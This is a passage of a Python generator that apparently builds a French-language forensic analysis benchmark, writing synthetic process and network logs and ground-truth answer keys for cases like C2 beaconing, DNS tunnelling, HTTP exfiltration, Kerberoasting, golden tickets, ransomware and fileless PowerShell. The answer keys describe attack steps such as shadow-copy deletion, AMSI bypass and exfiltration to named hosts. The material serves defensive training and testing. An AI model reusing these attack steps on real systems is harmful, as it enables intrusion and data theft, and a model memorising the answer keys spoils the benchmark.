        (5120, 884, 'MsMpEng.exe', '"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\MsMpEng.exe"', '2026-10-12 06:58:20'),
    ]
    with open(os.path.join(case_dir, 'ws-compta-03_cmdline.csv'), 'w', encoding='utf-8', newline='') as f:
        import csv
        wr = csv.writer(f)
        wr.writerow(['CreateTime', 'Host', 'PID', 'PPID', 'ImageFileName', 'User', 'Args'])
        for pid, ppid, name, args, ts in procs:
            wr.writerow([ts, 'WS-COMPTA-03', pid, ppid, name, 'CORP\\l.moreau' if pid > 2000 else 'SYSTEM', args])
    with open(os.path.join(case_dir, 'ws-compta-03_netscan.csv'), 'w', encoding='utf-8', newline='') as f:
        f.write('Created,Proto,LocalAddr,LocalPort,ForeignAddr,ForeignPort,State,PID,Owner\n')
        f.write('2026-10-12 08:04:03,TCPv4,10.10.5.63,50122,194.58.112.77,8443,ESTABLISHED,4312,powershell.exe\n')
        f.write('2026-10-12 07:42:40,TCPv4,10.10.5.63,50088,52.97.146.162,443,ESTABLISHED,3988,OUTLOOK.EXE\n')
        f.write('2026-10-12 06:58:30,TCPv4,10.10.5.63,50001,10.10.1.10,445,ESTABLISHED,4,System\n')


# ============================================================================
# Verites terrain
# ============================================================================

def _truth(case_dir, data):
    with open(os.path.join(case_dir, 'ground_truth.json'), 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
        f.write('\n')


def build_all(suite=SUITE):
    out = {}

    def case(name):
        path = os.path.join(suite, name)
        os.makedirs(path, exist_ok=True)
        return path

    d = case('net_c2_beacon_pcap')
    build_c2_beacon(d)
    from_ja3 = _beacon_ja3()
    _truth(d, {
        'description': ("WS-FIN-02 (10.20.30.15) resout cdn-telemetry-sync.net puis contacte 185.225.73.90:443 "
                        "toutes les 60 s (gigue < 1 %) avec un ClientHello TLS identique (JA3 " + from_ja3 + ") "
                        "et un certificat auto-signe : beacon C2 HTTPS. La navigation vers Wikipedia, Office 365 "
                        "et Le Monde est du bruit legitime."),
        'techniques': ['T1071.001'], 'forbidden_techniques': ['T1110', 'T1486', 'T1048', 'T1071.004'],
        'iocs': [C2_IP, C2_DOMAIN], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel domaine (SNI) le beacon contacte-t-il ?', 'answer': [C2_DOMAIN],
             'related': ['SNI', C2_IP]},
            {'id': 'Q2', 'question': 'Quel est l\'intervalle du beacon ?',
             'answer': ['60 s', '60 secondes', '60 seconds', 'toutes les 60', 'every 60'], 'related': ['intervalle', 'beacon']},
            {'id': 'Q3', 'question': 'Quelle est l\'empreinte JA3 (hash) du client C2 ?', 'answer': [from_ja3],
             'related': ['JA3']},
            {'id': 'Q4', 'question': 'Quel poste est infecte ?', 'answer': ['10.20.30.15', 'WS-FIN-02'],
             'related': ['poste']},
        ]})
    out['net_c2_beacon_pcap'] = from_ja3

    d = case('net_dns_tunnel_exfil')
    build_dns_tunnel(d)
    _truth(d, {
        'description': ("WS-RH-04 (10.20.30.22) exfiltre un fichier de paie encode en base32 dans des sous-domaines "
                        "de cdnsync-metrics.xyz (requetes TXT via le resolveur interne) : tunnel DNS."),
        'techniques': ['T1071.004', 'T1572', 'T1048'], 'forbidden_techniques': ['T1110', 'T1486', 'T1568.002'],
        'iocs': [TUNNEL_DOMAIN], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel domaine sert au tunnel DNS ?', 'answer': [TUNNEL_DOMAIN],
             'related': ['tunnel', 'sous-domaine']},
            {'id': 'Q2', 'question': 'Quel poste exfiltre ?', 'answer': ['10.20.30.22', 'WS-RH-04'], 'related': ['poste']},
            {'id': 'Q3', 'question': 'Quel type d\'enregistrement DNS est utilise ?', 'answer': ['TXT'],
             'related': ['type']},
        ]})

    d = case('net_http_exfil_carving')
    _p, archive_sha = build_http_exfil(d)
    _truth(d, {
        'description': ("WS-RH-07 (10.20.30.40) televerse l'archive rh_salaires_2026.zip (SHA-256 " + archive_sha + ") "
                        "par HTTP POST multipart vers http://45.155.205.99:8080/upload avec un User-Agent "
                        "WindowsPowerShell. Le reste est de la navigation intranet et Legifrance."),
        'techniques': ['T1048', 'T1560'], 'forbidden_techniques': ['T1110', 'T1486', 'T1071.004'],
        'iocs': [EXFIL_IP], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel fichier a ete exfiltre ?', 'answer': [EXFIL_NAME], 'related': ['archive', 'zip']},
            {'id': 'Q2', 'question': 'Vers quelle destination ?',
             'answer': [f'{EXFIL_IP}:{EXFIL_PORT}', f'http://{EXFIL_IP}:{EXFIL_PORT}/upload'], 'related': [EXFIL_IP]},
            {'id': 'Q3', 'question': 'Quelle est l\'empreinte SHA-256 de l\'archive extraite ?', 'answer': [archive_sha],
             'related': ['sha256', 'manifeste']},
            {'id': 'Q4', 'question': 'Quel outil cote client a realise l\'envoi ?',
             'answer': ['WindowsPowerShell', 'PowerShell'], 'related': ['User-Agent']},
        ]})
    out['net_http_exfil_carving'] = archive_sha

    d = case('ad_kerberoasting_dcsync')
    build_kerberoasting(d)
    _truth(d, {
        'description': ("Depuis WS-ADM-07 (10.10.5.23), j.martin demande en rafale des tickets de service RC4 "
                        "(0x17) pour 5 comptes de service (Kerberoasting), puis le compte svc_backup casse est "
                        "utilise pour une replication DCSync (4662 DS-Replication-Get-Changes / Get-Changes-All) "
                        "depuis un poste qui n'est pas un controleur. La replication de DC02$ est legitime."),
        'techniques': ['T1558.003', 'T1003.006'], 'forbidden_techniques': ['T1110', 'T1486', 'T1558.001'],
        'iocs': ['10.10.5.23'], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel compte a realise le Kerberoasting ?', 'answer': ['j.martin'],
             'related': ['4769', 'RC4']},
            {'id': 'Q2', 'question': 'Quel compte de service a servi au DCSync ?', 'answer': ['svc_backup'],
             'related': ['4662', 'DS-Replication']},
            {'id': 'Q3', 'question': 'Depuis quel poste ?', 'answer': ['WS-ADM-07', '10.10.5.23'], 'related': ['poste']},
        ]})

    d = case('ad_golden_ticket')
    build_golden_ticket(d)
    _truth(d, {
        'description': ("Depuis 10.10.7.44 (WS-SRV-07), un ticket Kerberos forge (Golden Ticket) au nom du compte "
                        "inexistant svc_admin_backup (domaine en minuscules, RID 500, RC4) obtient des tickets de "
                        "service sans aucune demande de TGT (4768) ; le TGT en cache a une duree de vie de 10 ans."),
        'techniques': ['T1558.001'], 'forbidden_techniques': ['T1558.003', 'T1110', 'T1486'],
        'iocs': ['10.10.7.44'], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel compte apparait dans le ticket forge ?', 'answer': ['svc_admin_backup'],
             'related': ['inexistant', '4769']},
            {'id': 'Q2', 'question': 'Quelle est la duree de vie du TGT forge ?',
             'answer': ['10 ans', '10 years', '3650 jours', '3650 days', '87600'], 'related': ['duree', 'klist']},
            {'id': 'Q3', 'question': 'Depuis quelle adresse ?', 'answer': ['10.10.7.44'], 'related': ['WS-SRV-07']},
        ]})

    d = case('ransomware_antiforensics')
    build_ransomware(d)
    _truth(d, {
        'description': ("Sur SRV-FICHIERS-01, adm.legrand (RDP depuis 10.10.9.31) lance C:\\ProgramData\\svchostupd.exe "
                        "(horodatage $SI antidate en 2019, $FN de 2026 : timestomping), supprime les cliches "
                        "instantanes (vssadmin, wmic), desactive la recuperation (bcdedit), purge le catalogue "
                        "wbadmin, chiffre les partages (extension .crypt7, note LISEZ-MOI_CRYPT7.txt) puis efface "
                        "les journaux System (104) et Security (1102)."),
        'techniques': ['T1486', 'T1490', 'T1070.001', 'T1070.006'],
        'forbidden_techniques': ['T1110', 'T1558.003', 'T1003.006'],
        'iocs': ['svchostupd.exe', '10.10.9.31'], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel fichier a ete antidate (timestomping) ?', 'answer': ['svchostupd.exe'],
             'related': ['$SI', '$FN', 'MFT']},
            {'id': 'Q2', 'question': 'Quelle extension les fichiers chiffres portent-ils ?', 'answer': ['.crypt7', 'crypt7'],
             'related': ['renommage']},
            {'id': 'Q3', 'question': 'Quels journaux ont ete effaces ?', 'answer': ['Security', 'securite'],
             'related': ['1102', '104']},
            {'id': 'Q4', 'question': 'Quel compte a lance le chiffrement ?', 'answer': ['adm.legrand'], 'related': ['RDP']},
        ]})

    d = case('fileless_powershell_memory')
    build_fileless(d)
    _truth(d, {
        'description': ("Sur WS-COMPTA-03, WINWORD.EXE (Facture_octobre.docm) lance powershell.exe (PID 4312) avec "
                        "une commande -enc : base64 UTF-16LE puis base64 gzip puis concatenations et operateur -f. "
                        "La charge desactive AMSI, telecharge " + C2_URL + " et le charge en memoire "
                        "(Assembly.Load) sans fichier. netscan confirme la connexion de PID 4312 vers "
                        "194.58.112.77:8443."),
        'techniques': ['T1059.001', 'T1027', 'T1620', 'T1105', 'T1562.001'],
        'forbidden_techniques': ['T1110', 'T1486', 'T1558.003'],
        'iocs': ['194.58.112.77'], 'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quelle URL de C2 la charge desobfusquee contacte-t-elle ?', 'answer': [C2_URL],
             'related': ['194.58.112.77', 'desobfuscation']},
            {'id': 'Q2', 'question': 'Quel PID execute la charge ?', 'answer': ['4312'], 'related': ['powershell.exe']},
            {'id': 'Q3', 'question': 'Quel processus parent a lance PowerShell ?', 'answer': ['WINWORD.EXE', 'winword'],
             'related': ['docm', 'macro']},
            {'id': 'Q4', 'question': 'Quelle protection est contournee ?', 'answer': ['AMSI', 'amsiInitFailed'],
             'related': ['AmsiUtils']},
        ]})
    return out


def _beacon_ja3():
    """JA3 du ClientHello de l'implant (calcule a partir des parametres du constructeur)."""
    h = BEACON_HELLO
    exts = [0] + list(h['extra_exts']) + [10, 11, 13]
    text = ','.join(['771', '-'.join(str(c) for c in h['ciphers']), '-'.join(str(e) for e in exts),
                     '-'.join(str(g) for g in h['groups']), '0'])
    return hashlib.md5(text.encode(), usedforsecurity=False).hexdigest()


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else SUITE
    for name, value in build_all(target).items():
        print(f'{name}: {value}')
    print(f'Cas generes dans {target}')
